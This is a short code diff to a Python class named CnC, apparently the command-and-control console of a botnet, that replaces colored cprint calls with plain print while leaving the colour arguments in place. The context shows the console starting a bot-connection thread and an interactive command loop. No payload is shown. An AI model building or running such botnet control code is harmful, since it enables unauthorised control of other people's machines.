@@ -204,12 +204,12 @@ class CnC:
         stop = threading.Event()
         bot_conn = threading.Thread(target=CnC.__bot_connection, args=(cnc, stop))
         bot_conn.start()
-        cprint("Botnet started...", "green")
+        print("Botnet started...", "green")
 
         cmd = 0
 
         while cmd != "exit":
-            cprint("\n('help' to view the commands list).", 'yellow')
+            print("\n('help' to view the commands list).", 'yellow')
             cmd = str.lower(input("\n> "))
             result = self.__run_cmd(cmd)
             print(result)
